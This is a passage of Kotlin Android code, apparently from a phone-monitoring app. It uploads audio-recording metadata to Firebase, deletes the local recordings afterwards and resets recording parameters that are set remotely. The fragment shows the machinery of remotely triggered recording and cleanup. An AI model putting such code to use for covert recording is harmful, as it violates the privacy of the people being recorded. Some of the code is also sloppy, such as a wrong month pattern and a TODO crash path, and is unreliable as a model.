                                        //    deleteFile2(it.toString())
                                    })
                        )
                    }
                }
            }
        } catch (e: Throwable) {
            Log.i("error sendfiles", e.message.toString())
        }

    }

    private fun setPushName() {
   //     val duration = FileHelper.getDurationFile(fileName!!)
     //   val recording = Recording(nameAudio, dateTime, duration)
  //      firebase.getDatabaseReference("$RECORDING/$DATA").push().setValue(recording)
//        deleteFile()
    }

    private fun setPushName2(filex: String) {
        var duration = ""
        var gg =  getDateTime()
        val dateTimexx = ConstFun.getDateTime()
        val text = "06 nov. 2022 11:41 a. m."
        val pattern = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            DateTimeFormatter.ofPattern("dd mm yyyy hh:mm")
        } else {
            TODO("VERSION.SDK_INT < O")
        }
//        val localDateTime = LocalDateTime.parse(filex, pattern)
//        val localDateTime1 = LocalDateTime.parse(text, pattern)

        if(filex.contains(".mp3"))
            duration = FileHelper.getDurationFile("${context.getFilePath()}/$ADDRESS_AUDIO_RECORDS/"+filex)
        val namex = filex.replace("${context.getFilePath()}/$ADDRESS_AUDIO_RECORDS","")
        val recording = Recording(namex, getDateTime(), duration)
        firebase.getDatabaseReference("$RECORDING/$DATA").push().setValue(recording)
        deleteFile2("${context.getFilePath()}/$ADDRESS_AUDIO_RECORDS/"+filex)
    }

    private fun resetParamsRecording() {
        val childRecording = ChildRecording(false, 0) //true, 1000*60*1
        firebase.getDatabaseReference("$RECORDING/$PARAMS").setValue(childRecording)
        setIntervalRecord(0)
    //    nameAudio = ""
//        val filePath = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD"
//      //  File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
//        var dateName = "" //fileName!!.replace("$filePath/", "")
//        var uri = Uri.fromFile(File("fileName"))

    }
}